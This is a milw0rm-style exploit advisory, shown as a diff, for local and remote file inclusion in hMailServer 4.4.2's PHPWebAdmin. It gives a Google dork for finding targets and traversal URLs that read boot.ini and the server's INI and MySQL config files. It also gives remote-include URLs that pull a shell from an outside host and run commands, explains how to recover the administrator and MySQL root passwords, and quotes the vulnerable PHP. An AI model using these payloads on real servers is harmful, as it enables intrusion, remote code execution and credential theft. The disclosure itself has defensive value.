@@ -1,0 +1,132 @@
+hMAilServer 4.4.2 (PHPWebAdmin) local & remote file inclusion poc
+by Nine:Situations:Group::strawdog
+--------------------------------------------------------------------------------
+
+our site: http://retrogod.altervista.org
+
+software site: http://www.hmailserver.com/
+description: http://en.wikipedia.org/wiki/HMailServer
+--------------------------------------------------------------------------------
+google dork: "PHPWebAdmin for hMailServer" intitle:PHPWebAdmin -site:hmailserver.com -dork
+
+poc:
+
+regardless of register_globals & magic_quotes_gpc:
+http://hostname/path_to_webadmin/index.php?page=background/../../../../../../../../boot.ini%00
+http://hostname/path_to_webadmin/index.php?page=background/../../Bin/hMailServer.INI%00
+http://hostname/path_to_webadmin/index.php?index.php?page=background/../../MySQL/my.ini%00
+http://hostname/path_to_webadmin/index.php?index.php?page=background/../../../../../../../../../Program+Files/hmailserver/Bin/hmailserver.ini%00
+
+with register_globals = on:
+(prepare a functions.php folder on somehost.com with an index.html with your shell inside on a php enabled server,
+otherwise a functions.php shell on a php disabled one)
+http://hostname/path_to_webadmin/initialize.php?hmail_config[includepath]=http://www.somehost.com/&cmd=dir
+
+with register_globals = on & magic_quotes_gpc = off :
+http://hostname/path_to_webadmin/initialize.php?hmail_config[includepath]=c:\boot.ini%00
+http://hostname/path_to_webadmin/initialize.php?hmail_config[includepath]=http://www.somehost.com/shell.txt%00&cmd=dir
+http://hostname/path_to_webadmin/initialize.php?hmail_config[includepath]=c:\Program+Files\hMailServer\Bin\hMailServer.INI%00
+http://hostname/path_to_webadmin/initialize.php?hmail_config[includepath]=../Bin/hMailServer.INI%00
+
+"Bin" folder can be found in a different location, disclose the path by simply calling:
+
+http://hostname/path_to_webadmin/initialize.php
+
+interesting file:
+
+hMailServer.INI - contains two interesting fields:
+- the "Administrator password" crypted with md5,
+- by having knowledge of that you can calculate the MySQL root password,
+  specified in the "password" field.
+  You can do this by using the /Addons/Utilities/DecryptBlowfish.vbs script
+
+(*)
+vulnerable code, index.php:
+<?php
+
+
+   error_reporting(E_ALL);
+
+   if (!file_exists("config.php"))
+   {
+   	echo "Please rename config-dist.php to config.php. The file is found in the PHPWebAdmin root folder.";
+   	die;
+   }
+
+   require_once("config.php");
+   require_once("initialize.php");
+
+   set_error_handler("ErrorHandler");
+
+   if (is_php5())
+      set_exception_handler("ExceptionHandler");
+
+
+
+   $page = hmailGetVar("page");
+
+   if ($page == "")
+      $page = "frontpage";
+
+   $isbackground = (substr($page, 0,10) == "background");
+
+
+   if ($isbackground)
+      $page = "$page.php";
+   else
+      $page = "hm_$page.php";
+
+   // Check that the page really exists.
+   $page = stripslashes($page);
+   if (!file_exists($page))
+      hmailHackingAttemp();
+
+   // If it's a background page, run here.
+   if ($isbackground)
+   {
+      include $page; //<------------------------------------------ !!!
+
+      // Page is run, die now.
+      die;
+   }
+...
+
+for clearness, here it is hmailGetVar() function in /include/functions.php:
+...
+function hmailGetVar($p_varname, $p_defaultvalue = null)
+{
+	$retval = $p_defaultvalue;
+	if(isset($_GET[$p_varname]))
+	{
+		$retval = $_GET[$p_varname];
+	}
+	else if (isset($_POST[$p_varname]))
+	{
+		$retval = $_POST[$p_varname];
+	}
+	else if (isset($_REQUEST[$p_varname]))
+	{
+		$retval	= $_REQUEST[$p_varname];
+	}
+	
+	if (get_magic_quotes_gpc())
+	   $retval = stripslashes($retval);
+	
+	return $retval;
+}
+...
+
+so the "page" argument can be passed by $_GET[], $_POST[] or $_COOKIE[] arrays.
+Note the stripslashes(), which disable magic_quotes_gpc on every argument passed.
+
+(**)
+initialize.php:
+...
+$hmail_config['rootpath']		= str_replace("\\","/",$hmail_config['rootpath']);
+$hmail_config['includepath']	= str_replace("\\","/",$hmail_config['includepath']);
+$hmail_config['temppath']		= str_replace("\\","/",$hmail_config['temppath']);
+require_once($hmail_config['includepath'] . "functions.php");
+...
+
+
+# milw0rm.com [2008-11-06]
